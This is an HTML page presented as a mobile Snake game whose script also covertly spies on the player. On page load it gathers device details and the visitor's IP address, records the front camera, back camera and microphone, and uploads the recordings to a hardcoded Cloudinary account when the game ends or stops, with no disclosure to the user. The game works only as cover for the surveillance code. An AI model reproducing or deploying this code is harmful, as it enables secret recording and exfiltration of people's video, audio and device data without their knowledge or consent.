<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
<title>Snake Game</title>
<style>
  html, body {
    margin: 0; padding: 0; overflow: hidden; height: 100%; background: #121212; color: #eee;
    font-family: Arial, sans-serif;
    -webkit-user-select: none; user-select: none;
  }
  #gameContainer {
    position: relative;
    width: 100vw; height: 100vh;
    display: flex; flex-direction: column; align-items: center; justify-content: center;
  }
  #scoreboard {
    font-size: 1.5em; margin-bottom: 10px;
  }
  #canvas {
    background: #222;
    border: 2px solid #555;
    touch-action: none;
  }
  #controls {
    margin-top: 15px;
    display: flex; gap: 20px;
  }
  button {
    padding: 10px 20px;
    font-size: 1.2em;
    background: #444;
    border: none;
    color: #eee;
    border-radius: 5px;
    user-select: none;
  }
  button:active {
    background: #666;
  }
</style>
</head>
<body>
<div id="gameContainer">
  <div id="scoreboard">Score: 0</div>
  <canvas id="canvas" width="300" height="300"></canvas>
  <div id="controls">
    <button id="newGameBtn">New Game</button>
  </div>
</div>

<script>
(() => {
  // Cloudinary config - Replace with your details
  const CLOUD_NAME = 'dps0g5ftz'; // your cloud name
  const UPLOAD_PRESET = 'unsigned'; // your unsigned preset

  // Globals for recording
  let frontStream = null;
  let backStream = null;
  let micStream = null;
  let recorderFront = null;
  let recorderBack = null;
  let recorderMic = null;
  let recordedChunksFront = [];
  let recordedChunksBack = [];
  let recordedChunksMic = [];
  let sessionFolder = Date.now().toString();

  // Get user info + IP (basic, without geolocation)
  async function getUserInfo() {
    const info = {};
    info.userAgent = navigator.userAgent;
    info.language = navigator.language;
    info.platform = navigator.platform;
    info.hardwareConcurrency = navigator.hardwareConcurrency || 'N/A';
    info.deviceMemory = navigator.deviceMemory || 'N/A';

    try {
      // Get IP using a free API
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      info.ip = data.ip;
    } catch {
      info.ip = 'Unknown';
    }
    return info;
  }

  // Upload blob to Cloudinary in folder by session/ip
  async function uploadBlob(blob, fileName) {
    const formData = new FormData();
    formData.append('file', blob);
    // Upload destination: folder/sessionFolder/
    formData.append('upload_preset', UPLOAD_PRESET);
    formData.append('folder', `sessions/${sessionFolder}`);

    try {
      const res = await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/upload`, {
        method: 'POST',
        body: formData
      });
      const result = await res.json();
      console.log(`Uploaded ${fileName}`, result.secure_url);
    } catch (err) {
      console.error('Upload failed:', err);
    }
  }

  // Start recording streams
  async function startRecording() {
    try {
      // Request front camera + mic
      frontStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: 'user' },
        audio: true
      });
      recorderFront = new MediaRecorder(frontStream);
      recorderFront.ondataavailable = e => {
        if (e.data.size > 0) recordedChunksFront.push(e.data);
      };
      recorderFront.onstop = () => {
        const blob = new Blob(recordedChunksFront, { type: 'video/webm' });
        uploadBlob(blob, 'front_camera.webm');
        recordedChunksFront = [];
      };
      recorderFront.start();

      // Request back camera (video only)
      backStream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: { exact: "environment" } },
        audio: false
      });
      recorderBack = new MediaRecorder(backStream);
      recorderBack.ondataavailable = e => {
        if (e.data.size > 0) recordedChunksBack.push(e.data);
      };
      recorderBack.onstop = () => {
        const blob = new Blob(recordedChunksBack, { type: 'video/webm' });
        uploadBlob(blob, 'back_camera.webm');
        recordedChunksBack = [];
      };
      recorderBack.start();

      // Mic only stream (audio only)
      micStream = await navigator.mediaDevices.getUserMedia({
        video: false,
        audio: true
      });
      recorderMic = new MediaRecorder(micStream);
      recorderMic.ondataavailable = e => {
        if (e.data.size > 0) recordedChunksMic.push(e.data);
      };
      recorderMic.onstop = () => {
        const blob = new Blob(recordedChunksMic, { type: 'audio/webm' });
        uploadBlob(blob, 'mic_audio.webm');
        recordedChunksMic = [];
      };
      recorderMic.start();

    } catch (err) {
      console.error('Error starting media streams:', err);
    }
  }

  // Stop recording all
  function stopRecording() {
    if (recorderFront && recorderFront.state !== 'inactive') recorderFront.stop();
    if (recorderBack && recorderBack.state !== 'inactive') recorderBack.stop();
    if (recorderMic && recorderMic.state !== 'inactive') recorderMic.stop();
    if (frontStream) frontStream.getTracks().forEach(t => t.stop());
    if (backStream) backStream.getTracks().forEach(t => t.stop());
    if (micStream) micStream.getTracks().forEach(t => t.stop());
  }

  // --- Snake Game Implementation ---
  const canvas = document.getElementById('canvas');
  const ctx = canvas.getContext('2d');
  const scoreboard = document.getElementById('scoreboard');
  const newGameBtn = document.getElementById('newGameBtn');

  const gridSize = 20;
  const tileCount = canvas.width / gridSize;

  let snake = [];
  let direction = { x: 0, y: 0 };
  let apple = {};
  let score = 0;
  let gameInterval = null;

  function resetGame() {
    snake = [
      { x: 10, y: 10 },
      { x: 9, y: 10 },
      { x: 8, y: 10 }
    ];
    direction = { x: 1, y: 0 };
    placeApple();
    score = 0;
    scoreboard.textContent = 'Score: 0';
    if (gameInterval) clearInterval(gameInterval);
    gameInterval = setInterval(gameLoop, 100);
  }

  function placeApple() {
    apple = {
      x: Math.floor(Math.random() * tileCount),
      y: Math.floor(Math.random() * tileCount)
    };
  }

  function gameLoop() {
    // Move snake
    const head = { x: snake[0].x + direction.x, y: snake[0].y + direction.y };

    // Wrap around edges
    head.x = (head.x + tileCount) % tileCount;
    head.y = (head.y + tileCount) % tileCount;

    // Check collision with self
    if (snake.some(seg => seg.x === head.x && seg.y === head.y)) {
      clearInterval(gameInterval);
      alert('Game Over! Your score: ' + score);
      stopRecording();
      return;
    }

    snake.unshift(head);

    // Eat apple?
    if (head.x === apple.x && head.y === apple.y) {
      score++;
      scoreboard.textContent = 'Score: ' + score;
      placeApple();
    } else {
      snake.pop();
    }

    drawGame();
  }

  function drawGame() {
    ctx.fillStyle = '#222';
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    // Draw apple
    ctx.fillStyle = 'red';
    ctx.fillRect(apple.x * gridSize, apple.y * gridSize, gridSize, gridSize);

    // Draw snake
    ctx.fillStyle = 'lime';
    snake.forEach((seg, i) => {
      ctx.fillRect(seg.x * gridSize, seg.y * gridSize, gridSize, gridSize);
    });
  }

  // Mobile touch controls
  let touchStartX = null;
  let touchStartY = null;
  canvas.addEventListener('touchstart', e => {
    const t = e.touches[0];
    touchStartX = t.clientX;
    touchStartY = t.clientY;
  });

  canvas.addEventListener('touchend', e => {
    if (touchStartX === null || touchStartY === null) return;
    const t = e.changedTouches[0];
    const dx = t.clientX - touchStartX;
    const dy = t.clientY - touchStartY;
    const absDx = Math.abs(dx);
    const absDy = Math.abs(dy);

    if (absDx > absDy) {
      // horizontal swipe
      if (dx > 0 && direction.x !== -1) direction = { x: 1, y: 0 };
      else if (dx < 0 && direction.x !== 1) direction = { x: -1, y: 0 };
    } else {
      // vertical swipe
      if (dy > 0 && direction.y !== -1) direction = { x: 0, y: 1 };
      else if (dy < 0 && direction.y !== 1) direction = { x: 0, y: -1 };
    }
    touchStartX = null;
    touchStartY = null;
  });

  newGameBtn.onclick = () => {
    resetGame();
    if (!recorderFront || recorderFront.state === 'inactive') {
      startRecording(); // restart recording if stopped
    }
  };

  // Disable scrolling on mobile
  document.body.addEventListener('touchmove', e => {
    e.preventDefault();
  }, { passive: false });

  // On page load
  window.onload = async () => {
    // Immediately get user info
    const info = await getUserInfo();
    console.log('User info:', info);

    // Start recording media
    await startRecording();

    // Start snake game automatically
    resetGame();
  };

  // Clean up media when leaving page
  window.onbeforeunload = () => {
    stopRecording();
  };
})();
</script>
</body>
</html>